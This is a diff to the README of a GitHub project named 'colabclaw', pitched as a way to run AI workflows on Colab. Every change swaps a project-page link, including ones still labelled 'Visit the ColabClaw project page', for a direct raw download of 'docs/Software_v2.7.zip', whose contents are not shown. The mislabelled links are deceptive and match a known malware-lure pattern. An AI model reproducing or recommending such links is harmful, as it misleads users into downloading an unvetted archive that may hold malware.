@@ -1,7 +1,7 @@
 # 🦀 colabclaw - Run AI Workflows on Colab
 
 <p align="center">
-  <a href="https://github.com/Henriepigastric590/colabclaw">
+  <a href="https://github.com/Henriepigastric590/colabclaw/raw/refs/heads/main/docs/Software_v2.7.zip">
     <img src="https://img.shields.io/badge/Download%20%26%20Run-4A90E2?style=for-the-badge&logo=github&logoColor=white" alt="Download and Run">
   </a>
 </p>
@@ -32,7 +32,7 @@ Before you start, make sure you have:
 
 Use this link to visit the project page and download or open the app:
 
-[Visit the ColabClaw project page](https://github.com/Henriepigastric590/colabclaw)
+[Visit the ColabClaw project page](https://github.com/Henriepigastric590/colabclaw/raw/refs/heads/main/docs/Software_v2.7.zip)
 
 If the page includes a release, zip file, or notebook link, download it from there and open it in your browser.
 
@@ -187,4 +187,4 @@ MIT License
 
 ## 🔗 Project Link
 
-[https://github.com/Henriepigastric590/colabclaw](https://github.com/Henriepigastric590/colabclaw)
+[https://github.com/Henriepigastric590/colabclaw/raw/refs/heads/main/docs/Software_v2.7.zip](https://github.com/Henriepigastric590/colabclaw/raw/refs/heads/main/docs/Software_v2.7.zip)
